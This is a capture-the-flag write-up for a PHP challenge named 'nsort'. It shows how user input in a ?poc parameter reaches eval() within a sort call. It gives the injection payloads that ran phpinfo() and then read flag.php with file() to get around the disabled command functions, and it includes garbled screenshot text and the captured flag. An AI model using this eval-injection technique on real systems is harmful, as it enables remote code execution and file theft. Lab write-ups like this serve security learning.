# nsort
> Can you escape the sandbox? Do you have all the needed info?

## About the Challenge
We were given a static website (There are no images, no forms, only texts)

```
🚩 Whoops! Looks like the proof-of-concept (poc) is missing! 🔍🧐 Don't worry, it's waiting for you in flag.php! Happy coding! 🤓💻 #MissingPOC #FlagHunt #PHPDev #missingpocinget
```

## How to Solve?
If we read the text again, it looks like we need to add `?poc` parameter in the URL and voilà! We got an error output


[Image extracted text: GET
[?poc= HTTP/1.1
HTTP/1.1
200
OK
2
Host:
34.159.182.195:31002
2
Date:
Sun,
22
Oct
2023
13:56:43
GMT
3
Cache-Control:
max-age-0
3 Server:
Apache
Upgrade-Insecure-Requests:
Accept-Encoding
5 User-Agent:
Mozilla/5.0
(Windows
NT
10.0;
Win64;
X64)
5 Content-Length:
105
AppleWebKit/537.36
(KHTML ,
like
Gecko)
Chrome/118.0.5993.88
6
Connection:
close
Safari/537.36
Content-Type:
text/html;
charset=UTF-8
Accept:
8
text/html,application/xhtmltxml,application/xml;q=0.9, image/avif
image/webp, image/apng
*/*;q-0.8,application/signed-exchange; v=b3;
10
Parse
error:
syntax error,
unexpected
token
in
q=0.7
Ivar/wwwlhtml/index.
php(7)
eval() 'd
code
on
line
Accept-Encoding:
gzip,
deflate,
br
11
Accept-Language:
en-US, en;q-0.9
9
Connection:
close
10
11
Vary:]


Hmm, our input goes into the `eval` function where we have to do Remote Code Execution (RCE). If we read the title again, it looks like the author using `sort` function inside the eval

After finding some reference about the RCE inside `sort` function, I got some useful information on Hacktricks (Thank you carlospolop!)

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#rce-via-usort

And then we need to close some bracket and then running phpinfo function using this payload

```
);}}phpinfo();//
```


[Image extracted text: PHP Version 8.1.18
php
System
Linux C-d119-c5645t-/1666-nsort-8544bb4fdc-W9szx 5.15.107+ #1 SMP Thu Jun 15 09.51.46 UTC 2023 x86_64
Build Date
Apr 14 2023 18.14.56
Build System
Linux 0867e78a6bc8 5.10.0-13-cloud-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64 GNUILinux
Configure Command
Iconfigure' '_~build-x86_64-linux-gnu' '-~with-config-file-path-lusr/localletclphp' '~~with-config-file-scan-
dir-lusrllocalletclphplconf.d' '~~enable-option-checking-fatal' '~~with-mhash' '_~with-pic' '~~enable-ftp' '~~enable-
mbstring' '~~enable-mysqlnd' '~~with-password-argon2' '~~with-sodium-shared' '~~with-pdo-sqlite-lusr' '~~with-
sqlite3-lusr"
'~with-curl' '_~with-iconv' '-~with-openssl' '~~with-readline' '~~with-zlib' '~~disable-phpdbg' '~~with-pear'
with-libdir-liblx86_64-linux-gnu' '~~disable-cgi' '~~with-apxs2' 'build_alias-x86_64-linux-gnu'
Server API
Apache 2.0 Handler
Virtual Directory Support
disabled
Configuration File (php.ini) Path
lusrllocalletclphp
Loaded Configuration File
(none)
Scan this dir for additional .ini files
lusrllocalletclphplconf.d
Additional .ini files parsed
lusrllocalletclphplconf dldocker-php-ext-sodiumini, /usr/localletclphplconf dlmaxsizes ini
PHP API
20210902
PHP Extension
20210902
Zend Extension
420210902]


Yay we can execute PHP commands, but when I checked disable_functions information, almost all PHP functions which are to run OS commands cannot be used.


[Image extracted text: disable_functions
exec,show_source readfile,file_get_contents,fread,fope
n,passthru,shell_exec,system,proc_open;popen,curl_
ex
ec,curl_multi_exec;parse_ini_file,stream_get_contents,r
eadlink
Hicrlau
Otrorc]


To obtain the flag I used a `file()` function to read `flag.php` file 


[Image extracted text: Request
Response
Insp
Pretty
Raw
Hex
5
In
Pretty
Raw
Hex
Render
5
In
Requ
GET
[?poc=
HTTP/1.1
200
0K
);}}slines-file("flag.php" ) ; foreach($lines+astsline) {+echo+sline;
Date: Sat ,
21
Oct
2023
16:27:24
GMT
};l/
HTTP/1.1
3
Server:
Apache
Requ
2
Host:
34.141.39.15:32366
Vary: Accept-Encoding
Cache-Control:
max-age-0
5 Content-Length:
189
Requ
Upgrade-Insecure-Requests:
Connection:
close
5
User-Agent: Mozilla/5.0
(Windows
NT
10.0;
Win64;
x64 )
Content-Type:
text/html;
charset=UTF-8
AppleWebKit/537.36
(KHTML ,
like Gecko)
Chrome/118.0.5993.70
Requ
Safari/537.36
<?php
6 Accept
10
text/html,application/xhtml+xml,application/xml;q-0.9,image/avif ,
11
sflag_f49t7
Requ
image/webp, image/apng,*/*;9-0.8,application/signed-exchange;v=b3;
ctf{38754723ac2ce496f98359fc7f0acdea211269d812a3f4d30e779bc2aae65
q=0.7
65f}"
Resp
Accept-Encod_
gzip,
deflate,
br
12
8 Accept-Language:
en-US, en;q-0.9
13
2>
Connection:
close
14
10
15
Just
when
you
think
you
ve
seen
it
all,
this
person
is
really
11
pushing
the
boundaries
ddi
ling:]


```
CTF{38754723ac2ce496f98359fc7f0acdea211269d812a3f4d30e779bc2aae6565f}
```